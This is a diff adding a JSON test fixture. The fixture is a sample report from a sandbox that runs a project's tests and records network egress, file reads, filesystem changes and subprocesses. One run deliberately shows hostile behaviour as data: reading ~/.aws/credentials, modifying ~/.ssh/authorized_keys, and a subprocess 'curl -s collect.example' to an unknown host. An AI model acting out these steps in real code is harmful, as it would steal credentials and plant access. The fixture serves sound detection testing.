@@ -1,0 +1,126 @@
+{
+  "_comment": [
+    "The canonical check report: one complete example of the shape docs/spec.md",
+    "Contract 2 describes, carrying every field at once so there is one place to",
+    "read the contract off rather than six hand-written copies that drift.",
+    "",
+    "This is the envelope a check sub-agent returns, not what `sniff.py` prints.",
+    "Each entry of `runs[]` is one `sniff.py run` or `sniff.py detonate` report",
+    "verbatim; the sub-agent adds `check`, its own per-check fields, and the",
+    "`derived`, `sensors` and `truncated` roll-ups over every run.",
+    "",
+    "The values are deliberately not all clean: a hard rule trips, a cap cuts, a",
+    "sensor is down. A fixture where nothing happened does not exercise any of",
+    "the code that reads it. Conformance tests in all three consumers load this",
+    "file -- sandbox/tests/test_contract.py, apps/cujo and apps/web -- so a field",
+    "added on one side and forgotten on another fails somewhere."
+  ],
+  "schema_version": 1,
+  "check": "tests",
+  "base": { "test_pricing.py::test_rounds_half_up": "pass" },
+  "head": { "test_pricing.py::test_rounds_half_up": "fail" },
+  "base_pass_head_fail": ["test_pricing.py::test_rounds_half_up"],
+  "runs": [
+    {
+      "schema_version": 1,
+      "argv": ["python3", "-m", "pytest", "-q"],
+      "exit": 1,
+      "duration_s": 4.31,
+      "window_exclusive": true,
+      "stdout_tail": "1 failed, 12 passed in 4.29s",
+      "stderr_tail": "",
+      "egress": [
+        { "host": "pypi.org", "port": 443, "bytes": 3200, "known": true },
+        { "host": "collect.example", "port": 443, "bytes": 512, "known": false }
+      ],
+      "files_read": [{ "path": "~/.aws/credentials", "sensitive": true }],
+      "fs_changes": [
+        {
+          "path": "~/work/head/.pytest_cache/CACHEDIR.TAG",
+          "type": "created",
+          "in_workspace": true,
+          "sensitive": false
+        },
+        {
+          "path": "~/.ssh/authorized_keys",
+          "type": "modified",
+          "in_workspace": false,
+          "sensitive": true
+        }
+      ],
+      "subprocesses": [{ "argv": ["sh", "-c", "curl -s collect.example"] }],
+      "secret_probe": { "decoy_read": true, "decoy_in_egress": null },
+      "sensors": {
+        "proxy": { "armed": true, "detail": "port 8899" },
+        "decoy": { "armed": true, "detail": "inotify" },
+        "audit": { "armed": true, "detail": "184 rows" },
+        "fs_diff": { "armed": true, "detail": "3181 paths" }
+      },
+      "truncated": {
+        "stdout_tail": false,
+        "stderr_tail": false,
+        "files_read": true,
+        "snapshot": false,
+        "hashes": false
+      },
+      "derived": {
+        "egress_to_unknown_host": true,
+        "wrote_outside_workspace": true,
+        "wrote_sensitive": true,
+        "spawned_subprocess": true
+      }
+    },
+    {
+      "schema_version": 1,
+      "argv": ["npm", "test"],
+      "exit": 0,
+      "duration_s": 11.02,
+      "window_exclusive": true,
+      "stdout_tail": "\\x1b[32mAll suites passed\\x1b[0m",
+      "stderr_tail": "",
+      "egress": [],
+      "files_read": [],
+      "fs_changes": [],
+      "subprocesses": [],
+      "secret_probe": { "decoy_read": false, "decoy_in_egress": null },
+      "sensors": {
+        "proxy": { "armed": true, "detail": "port 8899" },
+        "decoy": { "armed": false, "detail": "inotify, no longer running" },
+        "audit": { "armed": false, "detail": "no Python process ran" },
+        "fs_diff": { "armed": true, "detail": "3184 paths" }
+      },
+      "truncated": {
+        "stdout_tail": false,
+        "stderr_tail": false,
+        "files_read": false,
+        "snapshot": false,
+        "hashes": true
+      },
+      "derived": {
+        "egress_to_unknown_host": false,
+        "wrote_outside_workspace": false,
+        "wrote_sensitive": false,
+        "spawned_subprocess": false
+      }
+    }
+  ],
+  "sensors": {
+    "proxy": { "armed": true, "detail": "port 8899" },
+    "decoy": { "armed": false, "detail": "inotify, no longer running" },
+    "audit": { "armed": false, "detail": "no Python process ran" },
+    "fs_diff": { "armed": true, "detail": "3184 paths" }
+  },
+  "truncated": {
+    "stdout_tail": false,
+    "stderr_tail": false,
+    "files_read": true,
+    "snapshot": false,
+    "hashes": true
+  },
+  "derived": {
+    "egress_to_unknown_host": true,
+    "wrote_outside_workspace": true,
+    "wrote_sensitive": true,
+    "spawned_subprocess": true
+  }
+}
